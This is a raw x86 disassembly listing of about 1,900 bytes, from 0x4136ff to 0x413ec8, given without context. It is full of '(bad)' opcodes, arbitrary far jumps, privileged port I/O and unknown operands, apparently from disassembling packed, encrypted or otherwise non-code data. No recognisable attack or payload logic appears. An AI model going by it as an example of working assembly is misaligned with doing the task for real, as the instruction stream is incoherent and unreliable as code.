  4136ff:	push   ebp
  413700:	pop    ss
  413701:	rcl    DWORD PTR ds:0xa2e5fe4d,cl
  413707:	pushf  
  413708:	dec    eax
  413709:	push   0xffffffcb
  41370b:	(bad)  
  41370c:	push   edi
  41370d:	xor    ecx,esi
  41370f:	jbe    0x41375f
  413711:	gs dec ecx
  413713:	jmp    0xef43:0x90f00d93
  41371a:	lock sbb ebp,DWORD PTR [ebx-0x70]
  41371e:	bnd jne 0x4136fd
  413721:	or     al,0x58
  413723:	js     0x413744
  413725:	push   esp
  413726:	pop    es
  413727:	push   esi
  413728:	(bad)  
  413729:	mov    gs,WORD PTR cs:[ebx-0x7c]
  41372d:	ins    DWORD PTR es:[edi],dx
  41372e:	adc    ch,dh
  413730:	mov    ch,0x2c
  413732:	(bad)  
  413734:	shl    dh,0xe5
  413737:	call   0xa055:0x1cfcbd4b
  41373e:	and    dl,BYTE PTR [edi+ebx*8+0x3e12f816]
  413745:	xor    DWORD PTR [edi],eax
  413747:	xchg   ebx,eax
  413748:	xchg   esp,eax
  413749:	xchg   ecx,eax
  41374a:	retf   
  41374b:	sbb    BYTE PTR [edi],bl
  41374d:	sbb    eax,0x67fca748
  413752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413754:	es loop 0x4137b8
  413757:	ret    0x43d
  41375a:	fidivr WORD PTR [edi]
  41375c:	outs   dx,BYTE PTR ds:[esi]
  41375d:	enter  0x9f78,0x2c
  413761:	push   eax
  413762:	in     al,dx
  413763:	xor    eax,0xcd465524
  413768:	xchg   BYTE PTR [esi+edx*8-0x78],ch
  41376c:	or     eax,0xb33ef81a
  413771:	xor    bl,BYTE PTR [esi-0x24bba595]
  413777:	push   ebx
  413778:	adc    al,0xc2
  41377a:	push   ebx
  41377b:	iret   
  41377c:	add    BYTE PTR [edi+eiz*2-0x39],bl
  413780:	sub    al,0x5e
  413782:	mov    esp,0x43e250fc
  413787:	mov    dl,0x3d
  413789:	add    dh,bl
  41378b:	jle    0x413737
  41378d:	fiadd  DWORD PTR [edx+0x78]
  413790:	adc    eax,0x52f6b414
  413795:	sub    bl,0x3
  413798:	adc    ebp,DWORD PTR [eax+0x883f592]
  41379e:	mov    ds:0x11ea53c6,eax
  4137a3:	clc    
  4137a4:	add    al,0xee
  4137a6:	push   es
  4137a7:	mov    ds:0xc77bf14c,eax
  4137ac:	push   ss
  4137ad:	out    dx,al
  4137ae:	jle    0x413769
  4137b0:	xchg   BYTE PTR [eax],dl
  4137b2:	push   edi
  4137b3:	mov    esp,0xbf430922
  4137b8:	xor    eax,0xd6926b4c
  4137bd:	sub    edx,eax
  4137bf:	push   edx
  4137c0:	leave  
  4137c1:	outs   dx,DWORD PTR ds:[esi]
  4137c2:	ret    0x2f71
  4137c5:	test   al,0xac
  4137c7:	pop    edi
  4137c8:	stc    
  4137c9:	jbe    0x413770
  4137cb:	xchg   edi,eax
  4137cc:	cmp    BYTE PTR [edx+eax*4+0x477a2229],dh
  4137d3:	cwde   
  4137d4:	lods   eax,DWORD PTR ds:[esi]
  4137d5:	jle    0x41379c
  4137d7:	jp     0x4137ce
  4137d9:	rcl    BYTE PTR [edx],1
  4137db:	arpl   WORD PTR [esi+0x7dcb9b7b],sp
  4137e1:	inc    edx
  4137e2:	repz fwait
  4137e4:	(bad)  
  4137e5:	cld    
  4137e6:	daa    
  4137e7:	sbb    eax,edx
  4137e9:	push   eax
  4137ea:	pop    ecx
  4137eb:	adc    al,0xa5
  4137ed:	pop    edx
  4137ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137ef:	dec    eax
  4137f0:	push   ds
  4137f1:	(bad)  
  4137f2:	in     al,dx
  4137f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137f4:	stos   DWORD PTR es:[edi],eax
  4137f5:	fldcw  WORD PTR [ecx]
  4137f7:	xchg   ecx,eax
  4137f8:	sub    BYTE PTR [ecx-0x15072bca],dh
  4137fe:	dec    ebx
  4137ff:	xor    eax,0x58558138
  413804:	xor    eax,0xc4add6c1
  413809:	or     BYTE PTR [ebx+eax*2+0x43],ah
  41380d:	fild   QWORD PTR [ecx-0x24]
  413810:	fs inc eax
  413812:	stos   BYTE PTR es:[edi],al
  413813:	pop    ecx
  413814:	es fsub st,st(1)
  413817:	sbb    ebx,DWORD PTR [edx-0x43]
  41381a:	stos   DWORD PTR es:[edi],eax
  41381b:	dec    ebp
  41381c:	mov    DWORD PTR [ebx-0x66],esp
  41381f:	ins    BYTE PTR es:[edi],dx
  413820:	mov    ch,BYTE PTR [edi]
  413822:	sub    ecx,DWORD PTR [eax-0x7f]
  413825:	inc    edi
  413826:	cmp    DWORD PTR [ecx+0x9],esi
  413829:	push   ebp
  41382a:	dec    edx
  41382b:	fldcw  WORD PTR [ecx+0x634a72b0]
  413831:	inc    esi
  413832:	in     al,dx
  413833:	rol    DWORD PTR [ebx-0x2c],cl
  413836:	mov    ebx,0x41ba3740
  41383b:	mov    edx,edx
  41383d:	ret    0x5a5e
  413840:	(bad)  
  413842:	pop    edx
  413843:	movlps xmm3,QWORD PTR [ebp+0x4383877b]
  41384a:	sbb    al,0x21
  41384c:	xlat   BYTE PTR ds:[ebx]
  41384d:	sahf   
  41384e:	dec    edi
  41384f:	enter  0x7313,0x44
  413853:	arpl   WORD PTR [edx-0x1e],sp
  413856:	push   0x354d467e
  41385b:	test   al,0x28
  41385d:	or     ecx,ebx
  41385f:	leave  
  413860:	shl    BYTE PTR [ebp+edx*1-0x7298069e],cl
  413867:	pushw  es
  413869:	fmul   QWORD PTR [edi+0x25f2a032]
  41386f:	imul   ecx,DWORD PTR [eax-0x52549be8],0x528005c5
  413879:	sub    al,BYTE PTR [edi]
  41387b:	out    dx,al
  41387c:	mov    esi,0x4653f257
  413881:	xchg   esi,eax
  413882:	imul   ebx,DWORD PTR [ebx+0x68076fa6],0x32c62a26
  41388c:	call   0x31511b8e
  413891:	cli    
  413892:	sub    cl,BYTE PTR [ebx-0x5d]
  413895:	inc    eax
  413896:	fsubr  st,st(2)
  413898:	xchg   ebx,eax
  413899:	xor    bl,BYTE PTR [edi+0x7a]
  41389c:	dec    edx
  41389d:	jmp    0x3eba:0x76c4faa4
  4138a4:	scas   eax,DWORD PTR es:[edi]
  4138a5:	cmp    BYTE PTR ds:0xf1bab0fc,cl
  4138ab:	mov    ch,0x4a
  4138ad:	pop    ebp
  4138ae:	and    al,ch
  4138b0:	dec    eax
  4138b1:	lods   al,BYTE PTR ds:[esi]
  4138b2:	mov    ecx,0xe19076f3
  4138b7:	sbb    al,cl
  4138b9:	imul   edx,DWORD PTR [esi+0x13],0xffffffc2
  4138bd:	mov    eax,gs
  4138bf:	xlat   BYTE PTR ds:[ebx]
  4138c0:	shl    BYTE PTR [esi-0x35],1
  4138c3:	dec    esp
  4138c4:	ret    
  4138c5:	aam    0x6e
  4138c7:	adc    bh,BYTE PTR [ebp-0x5a]
  4138ca:	sbb    cl,BYTE PTR [eax]
  4138cc:	jae    0x4138da
  4138ce:	mov    edx,0x65b89f4e
  4138d3:	cld    
  4138d4:	xchg   ebx,eax
  4138d5:	in     al,0xd4
  4138d7:	pushf  
  4138d8:	and    eax,0x12230b13
  4138dd:	rcr    DWORD PTR [esi-0x6d],0x99
  4138e1:	mov    BYTE PTR [ebp-0x87d2e48],0x3f
  4138e8:	mov    dl,0xab
  4138ea:	push   0x34
  4138ec:	mov    DWORD PTR [edx+0x2d5a3584],0x272fbca5
  4138f6:	push   edi
  4138f7:	jp     0x4138fb
  4138f9:	or     ecx,edx
  4138fb:	xlat   BYTE PTR ds:[ebx]
  4138fc:	arpl   WORD PTR [eax-0x39892fc1],cx
  413902:	sub    ebx,DWORD PTR [edx+0x4]
  413905:	and    BYTE PTR [eax-0x78],dh
  413908:	mul    BYTE PTR [eax-0x56]
  41390b:	jl     0x4138d9
  41390d:	mov    dl,BYTE PTR [edi]
  41390f:	mov    eax,ds:0x9fd94c51
  413914:	jno    0x4138ee
  413916:	mov    BYTE PTR [ebx],bh
  413918:	aam    0x47
  41391a:	repz test DWORD PTR [eax+0x3918afd],eax
  413921:	cdq    
  413922:	pop    es
  413923:	xor    DWORD PTR [esi-0x71],ebp
  413926:	(bad)  
  413928:	idiv   BYTE PTR [eax]
  41392a:	pop    ss
  41392b:	(bad)  
  41392c:	or     eax,0xbca8a972
  413931:	fcomp  DWORD PTR [edx]
  413933:	scas   eax,DWORD PTR es:[edi]
  413934:	adc    DWORD PTR [eax+0x339da9c4],ebx
  41393a:	mov    esp,0x98e0579
  41393f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413940:	and    eax,0xb5279442
  413945:	xchg   ebx,eax
  413946:	shl    BYTE PTR [edi-0x6f],0x35
  41394a:	xor    al,0x4f
  41394c:	loopne 0x41396d
  41394e:	adc    BYTE PTR [ecx-0x1b8d0660],bl
  413954:	push   cs
  413955:	xchg   DWORD PTR [eiz*4+0x237f7af2],ebx
  41395c:	in     eax,0x1b
  41395e:	ja     0x4138e9
  413960:	xor    esp,ecx
  413962:	pop    es
  413963:	pop    ebx
  413964:	xlat   BYTE PTR ds:[ebx]
  413965:	test   BYTE PTR [eax+0x244c6fee],0x78
  41396c:	hlt    
  41396d:	in     eax,0x6c
  41396f:	retf   0x468f
  413972:	hlt    
  413973:	inc    ecx
  413974:	cmp    dh,0xb4
  413977:	add    bh,BYTE PTR [ecx]
  413979:	mov    bh,0x5f
  41397b:	mov    ebx,0x1b07a866
  413980:	mov    ds:0xbb57940c,eax
  413985:	sub    eax,0xc7fcf3b7
  41398a:	dec    esi
  41398b:	nop
  41398c:	jmp    0x85b76eea
  413991:	outs   dx,BYTE PTR ds:[esi]
  413992:	fwait
  413993:	adc    DWORD PTR [edx],eax
  413995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413996:	(bad)  
  413997:	loope  0x413982
  413999:	dec    edi
  41399a:	cmc    
  41399b:	loopne 0x41399a
  41399d:	mov    WORD PTR [ebx+0x79],gs
  4139a0:	stc    
  4139a1:	fsubr  st,st(4)
  4139a3:	push   ss
  4139a4:	fsub   DWORD PTR [edi-0x7ac2998]
  4139aa:	lods   al,BYTE PTR ds:[esi]
  4139ab:	out    0xc,eax
  4139ad:	mov    esp,0xd6692b0f
  4139b2:	mov    al,0x37
  4139b4:	ins    BYTE PTR es:[edi],dx
  4139b5:	and    ebp,0x77
  4139b8:	lods   eax,DWORD PTR ds:[esi]
  4139b9:	(bad)  
  4139ba:	test   eax,0x9f1a8efb
  4139bf:	enter  0xd684,0x64
  4139c3:	jb     0x413a12
  4139c5:	jbe    0x4139e7
  4139c7:	int3   
  4139c8:	and    al,0xb6
  4139ca:	ins    DWORD PTR es:[edi],dx
  4139cb:	jae    0x413986
  4139cd:	scas   ax,WORD PTR es:[edi]
  4139cf:	ficomp DWORD PTR [esi]
  4139d1:	lahf   
  4139d2:	cli    
  4139d3:	fcomp  DWORD PTR [ebx+eax*1]
  4139d6:	cmp    edx,DWORD PTR [esi+0x72]
  4139d9:	daa    
  4139da:	jb     0x4139e0
  4139dc:	mov    cs,WORD PTR [edx+0x4c460148]
  4139e2:	out    0xa5,eax
  4139e4:	sar    DWORD PTR [eax+ebp*2-0x67],cl
  4139e8:	rcr    BYTE PTR [ebp-0x66],1
  4139eb:	fcmovbe st,st(7)
  4139ed:	add    eax,0xdbba306d
  4139f2:	mov    dh,ah
  4139f4:	add    DWORD PTR [edx+0x3c],esi
  4139f7:	push   ecx
  4139f8:	jno    0x413a31
  4139fa:	fdivr  DWORD PTR [eax-0x77b6aa18]
  413a00:	mov    ds:0xe4d58dcf,eax
  413a05:	jmp    0xb000:0xf109ff73
  413a0c:	mov    dh,0x10
  413a0e:	adc    eax,DWORD PTR [eax]
  413a10:	pop    ebx
  413a11:	rol    dl,cl
  413a13:	jo     0x413a68
  413a15:	push   edx
  413a16:	jo     0x4139b1
  413a18:	jl     0x4139e6
  413a1a:	js     0x4139ce
  413a1c:	pop    ebx
  413a1d:	and    al,0x7d
  413a1f:	jg     0x413a70
  413a21:	out    0x94,eax
  413a23:	xchg   ebx,eax
  413a24:	jg     0x413a42
  413a26:	mov    ds:0x3a298f5b,eax
  413a2b:	aad    0x5b
  413a2d:	stos   BYTE PTR es:[edi],al
  413a2e:	sub    eax,0x223ee7a5
  413a33:	cmp    al,0x71
  413a35:	in     al,0x46
  413a37:	ret    
  413a38:	inc    eax
  413a39:	sub    BYTE PTR [ebx],al
  413a3b:	out    0x3e,al
  413a3d:	add    ah,0xb5
  413a40:	jecxz  0x413a60
  413a42:	mov    bh,0x83
  413a44:	xchg   edx,eax
  413a45:	or     dl,BYTE PTR [esi]
  413a47:	add    DWORD PTR [eax-0x79],edx
  413a4a:	adc    DWORD PTR ds:0xc240ae43,eax
  413a50:	jne    0x4139f0
  413a52:	sub    edi,ebx
  413a54:	cs mov al,0xa5
  413a57:	mov    esp,0xd45a2c56
  413a5c:	outs   dx,DWORD PTR ds:[esi]
  413a5d:	pop    ss
  413a5e:	mov    edi,0x4873d9ec
  413a63:	out    dx,eax
  413a64:	xlat   BYTE PTR ds:[ebx]
  413a65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a66:	stos   DWORD PTR es:[edi],eax
  413a67:	retf   0x1cc4
  413a6a:	xor    BYTE PTR [ecx],cl
  413a6c:	leave  
  413a6d:	sbb    dh,BYTE PTR [ebx+0x2de57844]
  413a73:	sub    DWORD PTR [ebp+0x1],esi
  413a76:	or     ah,ah
  413a78:	je     0x413a0a
  413a7a:	jecxz  0x413a64
  413a7c:	xor    ah,bl
  413a7e:	das    
  413a7f:	lea    ebx,[ebp+0x1deeeabb]
  413a85:	(bad)  
  413a86:	daa    
  413a87:	cli    
  413a88:	mov    ebp,edi
  413a8a:	jns    0x413a8e
  413a8c:	pushf  
  413a8d:	mov    WORD PTR [ebp+0xc],?
  413a90:	ja     0x413a9d
  413a92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a93:	std    
  413a94:	jecxz  0x413adf
  413a96:	mov    dl,0xe8
  413a98:	lea    eax,[ecx]
  413a9a:	int    0x44
  413a9c:	pop    es
  413a9d:	or     BYTE PTR [esi],ah
  413a9f:	push   cs
  413aa0:	fldenv ds:0x9ebacf85
  413aa6:	test   ecx,ebp
  413aa8:	faddp  st(2),st
  413aaa:	cld    
  413aab:	pop    ss
  413aac:	xchg   DWORD PTR [ecx],esp
  413aae:	jmp    0x1a249661
  413ab3:	xchg   edx,eax
  413ab4:	xchg   esp,eax
  413ab5:	mov    DWORD PTR [ecx-0x470e7500],ebp
  413abb:	out    dx,al
  413abc:	push   edi
  413abd:	sahf   
  413abe:	std    
  413abf:	sub    BYTE PTR [edi],bh
  413ac1:	fsub   DWORD PTR es:0xcf2effc5
  413ac8:	iret   
  413ac9:	pop    es
  413aca:	popf   
  413acb:	mov    bh,0xa
  413acd:	mov    dl,0x2b
  413acf:	mov    ah,0xef
  413ad1:	test   DWORD PTR [esi-0x42],ecx
  413ad4:	mov    ebp,0xcfcf68ab
  413ad9:	jl     0x413a62
  413adb:	inc    ebx
  413adc:	push   esi
  413add:	lods   al,BYTE PTR ds:[esi]
  413ade:	mov    ah,ch
  413ae0:	out    0x5f,eax
  413ae2:	mov    ds:0xeccc42a7,al
  413ae7:	test   DWORD PTR ds:0xa0e2822b,0x4ce9696b
  413af1:	hlt    
  413af2:	sbb    ah,BYTE PTR [di+0x6f]
  413af6:	test   ebp,ebp
  413af8:	mov    ah,0x6b
  413afa:	mov    bl,0xda
  413afc:	(bad)  
  413afd:	stc    
  413afe:	mov    eax,0xb28ebb72
  413b03:	inc    edx
  413b04:	test   al,0x57
  413b06:	mov    dl,0x98
  413b08:	rcl    ecx,cl
  413b0a:	adc    BYTE PTR gs:[esi+esi*2+0x52],dl
  413b0f:	loope  0x413b19
  413b11:	cmp    al,0xe0
  413b13:	test   eax,0xe8c370e1
  413b18:	call   0xacfd:0xd130bdc9
  413b1f:	xchg   ecx,eax
  413b20:	mov    gs,WORD PTR [edx-0x7adf3a97]
  413b26:	push   esi
  413b27:	into   
  413b28:	inc    ecx
  413b29:	aad    0xa
  413b2b:	test   BYTE PTR [ebp-0x719e06b3],cl
  413b31:	sar    ebp,1
  413b33:	pusha  
  413b34:	mov    DWORD PTR [eax],ebp
  413b36:	in     al,0x57
  413b38:	jns    0x413b72
  413b3a:	(bad)  
  413b3b:	icebp  
  413b3c:	lods   al,BYTE PTR ds:[esi]
  413b3d:	rcr    bl,1
  413b3f:	add    al,0xaa
  413b41:	shl    BYTE PTR [ecx+0x32],1
  413b44:	test   BYTE PTR [ecx-0x25],0x97
  413b48:	cmp    al,BYTE PTR fs:[ebp+0x6e6d75a5]
  413b4f:	mov    ebp,0x22441762
  413b54:	xchg   edx,eax
  413b55:	jge    0x413b46
  413b57:	adc    cl,BYTE PTR [esi]
  413b59:	add    al,0x4e
  413b5b:	les    edx,FWORD PTR [edi]
  413b5d:	push   edx
  413b5e:	mov    esi,0x852d717
  413b63:	pop    edx
  413b64:	fcomp  QWORD PTR [eax+0x304d729]
  413b6a:	dec    ecx
  413b6b:	mov    esp,0x70b1952f
  413b70:	mov    ebp,0xf3cda979
  413b75:	std    
  413b76:	lods   eax,DWORD PTR ds:[esi]
  413b77:	mov    WORD PTR [edi],cs
  413b79:	mov    eax,0x76cb2162
  413b7e:	fistp  WORD PTR [esi]
  413b80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b81:	jne    0x413b94
  413b83:	addr16 sub al,0xc3
  413b86:	retf   
  413b87:	jmp    0xebba:0x70061dc9
  413b8e:	popf   
  413b8f:	call   0x3c51:0xa24a3927
  413b96:	call   0x52b6:0x6466efe9
  413b9d:	jmp    0x413b71
  413b9f:	push   esi
  413ba0:	les    esi,FWORD PTR [edx]
  413ba2:	mov    ch,0x3b
  413ba4:	pop    ecx
  413ba5:	ins    BYTE PTR es:[edi],dx
  413ba6:	pop    ebp
  413ba7:	and    BYTE PTR [esi],dh
  413ba9:	push   ss
  413baa:	xor    esi,DWORD PTR [esi-0x18]
  413bad:	xlat   BYTE PTR ds:[ebx]
  413bae:	pusha  
  413baf:	pop    ds
  413bb0:	pop    ebp
  413bb1:	pop    esi
  413bb2:	pop    eax
  413bb3:	les    edi,FWORD PTR [edi+edi*4+0x4f]
  413bb7:	jo     0x413b50
  413bb9:	seta   BYTE PTR [eax-0x70a7e180]
  413bc0:	sub    ah,dl
  413bc2:	rcr    dl,1
  413bc4:	dec    esi
  413bc5:	and    eax,0xb14ff926
  413bca:	mov    al,ds:0x62afc09b
  413bcf:	and    al,BYTE PTR [esp+eax*1-0x5a]
  413bd3:	inc    eax
  413bd4:	lock fucom st(1)
  413bd7:	jne    0x413bd4
  413bd9:	rcl    DWORD PTR [eax+ebp*8-0x57ed4e59],1
  413be0:	test   eax,0x982a276
  413be5:	retf   
  413be6:	call   0x1a0f:0x1a45f6c0
  413bed:	ds jecxz 0x413c4d
  413bf0:	xor    ch,BYTE PTR [esi-0x653fcad6]
  413bf6:	mov    DWORD PTR ds:0xa382ee40,esi
  413bfc:	inc    eax
  413bfd:	outs   dx,BYTE PTR ds:[esi]
  413bfe:	pop    edx
  413bff:	add    BYTE PTR [ebx-0x70693e],al
  413c05:	inc    edi
  413c06:	daa    
  413c07:	xor    cl,al
  413c09:	add    DWORD PTR [esi-0x11],0xffffffc7
  413c0d:	cmc    
  413c0e:	mov    dl,0x1
  413c10:	push   es
  413c11:	cmp    dl,BYTE PTR [esi+0x4]
  413c14:	out    dx,al
  413c15:	xchg   edx,eax
  413c16:	retf   0x4b5c
  413c19:	jb     0x413c60
  413c1b:	test   al,0x1b
  413c1d:	dec    esp
  413c1e:	inc    ebp
  413c1f:	mov    ?,WORD PTR [ecx-0x4e]
  413c22:	stc    
  413c23:	dec    edi
  413c24:	jne    0x413c03
  413c26:	stos   DWORD PTR es:[edi],eax
  413c27:	sub    DWORD PTR [eax-0x46],edi
  413c2a:	imul   edx,DWORD PTR [eax-0x6c],0x5d
  413c2e:	sub    edi,ecx
  413c30:	jl     0x413c88
  413c32:	lock push ebp
  413c34:	sbb    bl,BYTE PTR [edi-0x38342528]
  413c3a:	test   al,0x73
  413c3c:	mov    ebx,DWORD PTR [eax]
  413c3e:	rol    BYTE PTR [esi+0x3f],cl
  413c41:	xchg   ecx,eax
  413c42:	scas   eax,DWORD PTR es:[edi]
  413c43:	lds    eax,FWORD PTR [esi-0x573c9a02]
  413c49:	cmp    dl,dl
  413c4b:	jg     0x413bcd
  413c4d:	int3   
  413c4e:	jg     0x413c2f
  413c50:	mov    eax,gs:0x6c863f74
  413c56:	push   0x47
  413c58:	xor    ch,BYTE PTR [ebp-0x13]
  413c5b:	daa    
  413c5c:	xchg   ecx,eax
  413c5d:	adc    esi,DWORD PTR [edi+0x6e]
  413c60:	in     eax,0xcb
  413c62:	fisttp QWORD PTR [ecx+ebp*2-0x56]
  413c66:	icebp  
  413c67:	inc    edi
  413c68:	test   eax,0x65533676
  413c6d:	shl    BYTE PTR [esi-0xb],1
  413c70:	mov    eax,0xb872bff
  413c75:	pop    esi
  413c76:	scas   eax,DWORD PTR es:[edi]
  413c77:	xchg   edx,eax
  413c78:	mov    cl,0x37
  413c7a:	test   al,0x61
  413c7c:	add    al,0x98
  413c7e:	adc    DWORD PTR [esp+eax*8-0x3],eax
  413c82:	mov    bh,0xe5
  413c84:	in     eax,0x30
  413c86:	call   0x9a14c703
  413c8b:	push   es
  413c8c:	xor    DWORD PTR [edx+ebx*4-0x48],edx
  413c90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c91:	xchg   ebp,eax
  413c92:	mov    ch,0xc7
  413c94:	mov    ds:0x71bd38cb,al
  413c99:	mov    ecx,0x2b7f880f
  413c9e:	js     0x413cee
  413ca0:	mov    al,ds:0xbc56e0c4
  413ca5:	xor    BYTE PTR [esi-0x5453d61c],ah
  413cab:	and    ebp,ebx
  413cad:	mov    bh,0xb9
  413caf:	inc    ebp
  413cb0:	mov    edi,0xd72ceded
  413cb5:	call   0x3718ec8
  413cba:	jns    0x413cfd
  413cbc:	cli    
  413cbd:	jne    0x413cd0
  413cbf:	fidiv  DWORD PTR [ecx-0x6]
  413cc2:	mov    dl,0xdb
  413cc4:	pop    ebp
  413cc5:	push   ecx
  413cc6:	(bad)  
  413cc7:	push   si
  413cc9:	repnz nop
  413ccb:	dec    eax
  413ccc:	sbb    ebx,edi
  413cce:	sub    al,0x68
  413cd0:	jg     0x413cd2
  413cd2:	aas    
  413cd3:	xchg   esi,eax
  413cd4:	sub    BYTE PTR [edx+0x42deacbf],ch
  413cda:	add    eax,0x62
  413cdd:	inc    ebx
  413cde:	mov    BYTE PTR [esi+0x1a464bf],ah
  413ce4:	int    0x5b
  413ce6:	(bad)  
  413ce8:	mov    esp,0xeecca8ae
  413ced:	gs mov bl,0xa9
  413cf0:	pop    esp
  413cf1:	pop    edi
  413cf2:	inc    edx
  413cf3:	dec    ebp
  413cf4:	xor    eax,0x31f118d9
  413cf9:	push   edx
  413cfa:	jbe    0x413c89
  413cfc:	mov    ebx,0xe290949d
  413d01:	dec    edx
  413d02:	fist   DWORD PTR [ebx]
  413d04:	jnp    0x413d2c
  413d06:	jge    0x413cf1
  413d08:	xor    ecx,ebx
  413d0a:	inc    edx
  413d0b:	push   edx
  413d0c:	call   0x520:0x3fc29205
  413d13:	sar    DWORD PTR [esi],cl
  413d15:	aam    0xbd
  413d17:	mov    al,0x87
  413d19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d1a:	loop   0x413cef
  413d1c:	enter  0xb834,0xa2
  413d20:	outs   dx,DWORD PTR ds:[esi]
  413d21:	pop    es
  413d22:	xchg   BYTE PTR [edx-0x6e58d4f8],dh
  413d28:	call   0x9a74:0x9f07c5a5
  413d2f:	mov    ah,0xfb
  413d31:	enter  0xe5b7,0xca
  413d35:	cwde   
  413d36:	lds    esi,FWORD PTR [esp+ebp*2-0xe911aad]
  413d3d:	mov    cl,0xa
  413d3f:	adc    eax,0x4066b3ce
  413d44:	ret    
  413d45:	add    BYTE PTR [edx-0x2abb4506],cl
  413d4b:	psrlw  mm2,QWORD PTR [eax+0x2250393a]
  413d52:	xor    edx,0xffffff91
  413d55:	int    0x99
  413d57:	cmp    eax,0x736820cb
  413d5c:	enter  0xcbb0,0xbb
  413d60:	popa   
  413d61:	addr16 pop ebx
  413d63:	out    dx,al
  413d64:	pop    ebx
  413d65:	sub    al,0x40
  413d67:	(bad)  
  413d68:	mov    dl,0x93
  413d6a:	sbb    al,0xd8
  413d6c:	pusha  
  413d6d:	call   0x3457aa90
  413d72:	(bad)  
  413d74:	ret    0x6de2
  413d77:	jbe    0x413d55
  413d79:	test   ebx,ebp
  413d7b:	pop    es
  413d7c:	pushf  
  413d7d:	popa   
  413d7e:	push   esp
  413d7f:	or     al,0xd5
  413d81:	jmp    0x58b3:0xea804148
  413d88:	push   esi
  413d89:	ja     0x413d34
  413d8b:	jb     0x413d37
  413d8d:	jbe    0x413da2
  413d8f:	ret    0xd0dd
  413d92:	rol    DWORD PTR [edi-0x61],cl
  413d95:	std    
  413d96:	loop   0x413dad
  413d98:	push   edx
  413d99:	push   esp
  413d9a:	gs call 0x89431c7
  413da0:	mov    cl,0xd6
  413da2:	mov    edi,0xda587a07
  413da7:	xchg   ebp,eax
  413da8:	or     eax,0x75280e0c
  413dad:	sub    edi,DWORD PTR [edi]
  413daf:	and    DWORD PTR [ecx-0x22],ecx
  413db2:	repnz inc edi
  413db4:	aas    
  413db5:	inc    ecx
  413db6:	inc    ecx
  413db7:	(bad)  
  413db8:	jmp    0x77a5fe74
  413dbd:	mov    ecx,0x655c076f
  413dc2:	jmp    0x413d63
  413dc4:	stos   BYTE PTR es:[edi],al
  413dc5:	jnp    0x413dd5
  413dc7:	cli    
  413dc8:	mov    al,ds:0x3f6ebb3f
  413dcd:	lods   al,BYTE PTR ds:[esi]
  413dce:	jns    0x413dd5
  413dd0:	enter  0x976b,0x7c
  413dd4:	jg     0x413e0f
  413dd6:	mov    DWORD PTR [ebp-0xe],esi
  413dd9:	aaa    
  413dda:	push   ss
  413ddb:	dec    ebp
  413ddc:	mov    bh,0x29
  413dde:	dec    eax
  413ddf:	push   edx
  413de0:	int3   
  413de1:	sub    dl,dh
  413de3:	cmp    al,0x5a
  413de5:	dec    ebp
  413de6:	dec    esp
  413de7:	cli    
  413de8:	sbb    al,0xea
  413dea:	fwait
  413deb:	mov    ebx,0x53d51aaa
  413df0:	inc    ecx
  413df1:	sbb    DWORD PTR [esp+eiz*4],eax
  413df4:	push   ebp
  413df5:	inc    esi
  413df6:	xchg   ebx,eax
  413df7:	mov    eax,ds:0x7ae1c7b
  413dfc:	jmp    0x88993ce2
  413e01:	add    al,0x51
  413e03:	test   eax,0x2960ffc0
  413e08:	sti    
  413e09:	scas   eax,DWORD PTR es:[edi]
  413e0a:	mov    ah,0x6c
  413e0c:	out    dx,eax
  413e0d:	mov    ebx,0x6b9ef594
  413e12:	jmp    0x413dd6
  413e14:	mov    ch,0xd5
  413e16:	push   ecx
  413e17:	ret    0x26ca
  413e1a:	pop    ds
  413e1b:	sbb    eax,0xf8596bb0
  413e20:	ret    0x1bf8
  413e23:	pusha  
  413e24:	fld    st(5)
  413e26:	xchg   esi,eax
  413e27:	fstp   TBYTE PTR [ebx+0x67]
  413e2a:	ja     0x413dd3
  413e2c:	nop
  413e2d:	push   ds
  413e2e:	or     eax,0x9958bab9
  413e33:	inc    esi
  413e34:	aam    0x6d
  413e36:	call   0x1f8:0xea8c89c
  413e3d:	jmp    0xd976eeb
  413e42:	push   cs
  413e43:	rcr    esp,cl
  413e45:	repz inc ebx
  413e47:	adc    eax,0x592f4322
  413e4c:	lahf   
  413e4d:	jmp    DWORD PTR [esi+0x1e]
  413e50:	lods   eax,DWORD PTR ds:[esi]
  413e51:	mov    ?,WORD PTR [ecx-0x438ae0d2]
  413e57:	inc    ecx
  413e58:	mov    esp,DWORD PTR ds:0x932f48cc
  413e5e:	mov    edx,0x5562183f
  413e63:	je     0x413e03
  413e65:	adc    DWORD PTR [eax-0x3bfaf5a0],eax
  413e6b:	pop    eax
  413e6c:	hlt    
  413e6d:	ja     0x413e63
  413e6f:	call   FWORD PTR [ebp-0x43]
  413e72:	push   esp
  413e73:	sbb    al,0xfe
  413e75:	mov    eax,ds:0xff1bffc0
  413e7a:	dec    ebp
  413e7b:	rcr    DWORD PTR [esi+0x17de092c],1
  413e81:	dec    ebp
  413e82:	popf   
  413e83:	sbb    DWORD PTR [ecx+0x73a57e8e],esp
  413e89:	and    eax,0x97934548
  413e8e:	sar    DWORD PTR [edx],0x65
  413e91:	int3   
  413e92:	into   
  413e93:	retf   
  413e94:	xor    eax,0xb53bedbe
  413e99:	push   ebp
  413e9a:	mov    ch,0x81
  413e9c:	mov    ss,WORD PTR [ebx]
  413e9e:	pop    ss
  413e9f:	xchg   ebx,eax
  413ea0:	jge    0x413e67
  413ea2:	sbb    al,0x86
  413ea4:	popf   
  413ea5:	sub    eax,0x4e8d481f
  413eaa:	cmp    eax,0xde3bfc3f
  413eaf:	(bad)  
  413eb0:	push   DWORD PTR [esi+0x57b9bc3e]
  413eb6:	mul    BYTE PTR [ebx-0x2f]
  413eb9:	sti    
  413eba:	sar    DWORD PTR [ecx],1
  413ebc:	fs jbe 0x413e7e
  413ebf:	mov    eax,0x544fea2f
  413ec4:	push   ss
  413ec5:	repnz mov dl,BYTE PTR [edi]
  413ec8:	repnz sub cl,BYTE PTR [ebp+0x3f375c91]
